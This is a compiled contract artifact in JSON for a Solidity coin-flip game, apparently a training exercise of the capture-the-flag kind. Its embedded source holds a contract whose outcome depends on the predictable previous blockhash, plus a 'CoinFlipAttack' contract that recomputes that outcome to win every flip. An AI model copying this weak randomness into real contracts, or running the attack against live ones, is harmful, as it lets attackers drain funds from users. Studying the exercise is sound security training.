{
  "contractName": "CoinFlip",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "consecutiveWins",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "winner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "bool",
          "name": "_guess",
          "type": "bool"
        }
      ],
      "name": "flip",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getWinner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "getconsecutiveWins",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506104988061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c80631d263f671461005c57806321c335e11461008c5780638e7ea5b2146100aa578063dfbf53ae146100c8578063e6f334d7146100e6575b600080fd5b61007660048036038101906100719190610250565b610104565b60405161008391906102c1565b60405180910390f35b6100946101dc565b6040516100a191906102dc565b60405180910390f35b6100b26101e5565b6040516100bf91906102a6565b60405180910390f35b6100d061020f565b6040516100dd91906102a6565b60405180910390f35b6100ee610235565b6040516100fb91906102dc565b60405180910390f35b6000806001436101149190610328565b4060001c905080600154141561012957600080fd5b8060018190555060006002548261014091906102f7565b9050600060018214610153576000610156565b60015b905084151581151514156101c857600080815480929190610176906103a4565b919050555033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600193505050506101d7565b60008081905550600093505050505b919050565b60008054905090565b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60005481565b60008135905061024a8161044b565b92915050565b60006020828403121561026257600080fd5b60006102708482850161023b565b91505092915050565b6102828161035c565b82525050565b6102918161036e565b82525050565b6102a08161039a565b82525050565b60006020820190506102bb6000830184610279565b92915050565b60006020820190506102d66000830184610288565b92915050565b60006020820190506102f16000830184610297565b92915050565b60006103028261039a565b915061030d8361039a565b92508261031d5761031c61041c565b5b828204905092915050565b60006103338261039a565b915061033e8361039a565b925082821015610351576103506103ed565b5b828203905092915050565b60006103678261037a565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006103af8261039a565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156103e2576103e16103ed565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6104548161036e565b811461045f57600080fd5b5056fea2646970667358221220b6e2e05df584b33a40665daf073761d75e87ad9c69e34bbe1c80b7cea45fe39c64736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n  address public winner;\r\n\r\n  constructor() {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue / FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      winner= msg.sender;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n\r\n  function getWinner()public  view returns (address){\r\n    return winner;\r\n  }\r\n  function getconsecutiveWins()public  view returns (uint256){\r\n    return consecutiveWins;\r\n  }\r\n}\r\ncontract CoinFlipAttack {\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  function attack(address _victim) public returns (bool) {\r\n    CoinFlip coinflip = CoinFlip(_victim);\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\r\n    bool side = coinFlip == 1 ? true : false;\r\n    coinflip.flip(side);\r\n    return side;\r\n  }\r\n}\r\n",
  "sourcePath": "D:\\Test\\CoinFlip\\contracts\\phish.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-08T07:59:19.069Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}